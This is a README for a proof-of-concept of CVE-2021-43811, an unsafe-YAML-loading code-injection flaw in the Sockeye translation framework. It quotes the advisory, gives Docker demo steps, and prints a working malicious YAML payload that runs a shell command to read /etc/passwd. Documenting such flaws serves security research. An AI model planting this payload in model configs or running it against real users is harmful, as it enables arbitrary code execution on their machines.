# CVE-2021-43811
awslabs/sockeye Code injection via unsafe YAML loading CVE-2021-43811

## NVD Description

Sockeye is an open-source sequence-to-sequence framework for Neural Machine Translation built on PyTorch. Sockeye uses YAML to store model and data configurations on disk. Versions below 2.3.24 use unsafe YAML loading, which can be made to execute arbitrary code embedded in config files. An attacker can add malicious code to the config file of a trained model and attempt to convince users to download and run it. If users run the model, the embedded code will run locally. The issue is fixed in version 2.3.24.

## Demo

![cve-2021-43811](https://user-images.githubusercontent.com/56715563/185784647-fc6a885c-3032-487a-aa4f-f1535b669294.gif)


## Set Up

1. Build an image from a Dockerfile

```
docker build -t cve-2021-43811 .
```

2. Run python main.py in a new container

```
docker run -it --rm cve-2021-43811
```

output /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-- snip --
```

![output-image](https://user-images.githubusercontent.com/56715563/185784247-d765d388-053c-4784-8c98-65401384f3c2.png)

## PoC Payload

malicious.yml
```
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('cat /etc/passwd')"
```

## Reference

- https://github.com/awslabs/sockeye/security/advisories/GHSA-ggmr-44cv-24pm
